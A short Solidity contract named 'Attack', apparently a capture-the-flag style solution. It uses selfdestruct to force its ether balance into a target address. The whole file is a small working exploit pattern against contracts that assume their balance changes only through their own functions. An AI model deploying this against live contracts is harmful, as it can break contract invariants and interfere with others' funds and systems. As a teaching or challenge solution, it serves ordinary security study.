pragma solidity ^0.6.0;

contract Attack {
    constructor() public payable {}

    function RIP(address payable Force) public {
        selfdestruct(Force);
    }
}
